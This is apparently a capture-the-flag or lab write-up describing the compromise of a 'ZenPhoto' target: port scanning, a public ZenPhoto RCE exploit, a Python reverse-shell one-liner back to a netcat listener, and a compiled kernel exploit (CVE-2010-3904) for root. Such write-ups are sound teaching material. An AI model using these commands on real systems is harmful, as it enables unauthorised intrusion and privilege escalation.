# ZenPhoto

## Nmap

```
192.168.59.41 -sS -sV -p-        

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

Given the open ports that we have and the versions running on them I am going to jump straight into port 80.

![http://192.168.59.41/](<../../../.gitbook/assets/image (743).png>)

The root page for the target machine takes us to a blank page headed 'UNDER CONSTRUCTION'. Ideally we should break out some directory enumeration and `nikto`.

`feroxbuster` and `nikto` both pick up the directory /test/ and subsequent directories.

![Nikto](<../../../.gitbook/assets/image (745).png>)

The /test/ directory takes us to the following page which as per the bottom right is running on ZenPhoto.

Viewing the page source and scrolling to the bottom reveals the exact version of ZenPhoto that we are running.

## Exploitation

A quick Google search for a exploit on this version of ZenPhoto reveals a result for a RCE exploit.

I downloaded the exploit and run it with the following syntax:

```
php exploit.php <Target-IP> <ZenPhoto-Dir>
```

## Stable Shell

We now have a shell on the target machine and we are running as the user www-data. I found with this shell that when you try changing directories or running scripts it would have unexpected behaviour.

I performed a quick check to see if python was installed using `which python`. After confirming Python is installed I tried a quick one liner reverse shell to see if we can get a more stable one.

First I started a `netcat` listener on my attacking machine:

```
sudo nc -lvp 443
```

The run the following command on the target machine:

```
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

We now have a more stable shell.

## Privilege Escalation

I then started a `Python SimpleHTTPServer` on my attacking machine and downloaded some scripts for privilege escalation.

I executed `suggester.sh` which picked up the follow exploit as being 'highly probable'.

```
[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]

```

{% embed url="https://www.exploit-db.com/exploits/15285" %}

I downloaded the file onto the attacking machine using `wget` then compiled using `gcc`.

```
gcc exploit.c -o exploit
```

After compiling was finished I used `chmod` to make the exploit executable.

```
chmod +x exploit
```

I then executed the exploit and was able to gain a root shell.
